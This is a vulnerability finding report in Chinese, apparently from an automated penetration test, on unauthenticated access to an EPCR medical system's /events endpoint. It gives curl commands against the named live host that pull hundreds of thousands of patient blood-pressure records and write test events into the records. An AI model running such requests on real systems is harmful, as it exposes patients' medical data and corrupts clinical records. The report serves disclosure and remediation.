# EPCR vitalSignVideoServer /events 端点未授权访问（读+写）

- ID: `8d92a0dd-ae3b-40bc-aa1c-1ac8c9b512e7`
- Severity: **high**
- Status: confirmed
- Type: 未授权访问
- Target: `https://epcr.tpf.gov.tw:4001/events`
- Conversation: `667feba8-aeb6-43db-baa4-1e16ab996122`
- Created: 2026-08-29 05:58:13.736359786+08:00

## Description

EPCR 医疗系统的 vitalSignVideoServer (4001) /events 端点无需认证即可访问，返回 567,201 条 PCDT（压力负荷试验）事件数据，包含患者 CaseID、recordUuid、时间戳、生命征象（Systolic/Diastolic/Mean 血压）等敏感医疗数据。此外 POST /events 也无需认证即可创建新事件。

## Reproduction

1. 打开浏览器或 curl 访问 https://epcr.tpf.gov.tw:4001/events
2. 无需任何认证头或 Cookie，直接返回 200 OK
3. 响应体为 JSON 数组，包含 567,201 条 PCDT 事件记录
4. 每条记录包含: id, CaseID, TypeOfEventTxt, Caption, Timestamp, recordUuid, Value, Systolic, Diastolic, Mean, BPUnit, Elapsed, createdAt
5. 测试 POST: curl -X POST https://epcr.tpf.gov.tw:4001/events -H 'Content-Type: application/json' -d '{"CaseID":"test","TypeOfEventTxt":"Test"}' → 201 Created

## Evidence

--- retest 2026-08-31 ---
2026-08-31 整理：并入 d939d151。
1. GET https://epcr.tpf.gov.tw:4001/events → 200 OK, content-range: items 0-99/567201, 返回前 100 条事件 JSON
2. GET https://epcr.tpf.gov.tw:4001/events?CaseID=180717152801fed7 → 200 OK, 返回特定 CaseID 的事件（End of PCDT, recordUuid: Test180805142701）
3. POST https://epcr.tpf.gov.tw:4001/events body {"CaseID":"test-case-123","TypeOfEventTxt":"TestEvent","Caption":"Test Event","Value":100} → 201 Created, location: /events/567203
4. 响应头: x-powered-by: Express, content-type: application/json; charset=utf-8

## Impact

1. 数据泄露：567,201 条 PCDT 事件记录暴露，包含患者血压数据（Systolic/Diastolic/Mean）、测试时间戳、CaseID 等医疗敏感信息
2. 数据篡改：攻击者可创建虚假 PCDT 事件，污染医疗记录
3. 攻击面扩大：CaseID 可预测/枚举，可能关联更多患者数据
4. 医疗系统数据完整性风险：未授权写入可能影响临床决策

## Recommendation

1. 在 4001 /events 端点添加 JWT 认证中间件，验证 Authorization Bearer Token
2. 实现 RBAC 权限控制，区分读/写权限
3. 添加 Rate Limiting 防止大规模数据拉取
4. 对 POST /events 添加输入验证和审计日志
5. 考虑使用数据库级别的行级安全（RLS）限制可访问的记录
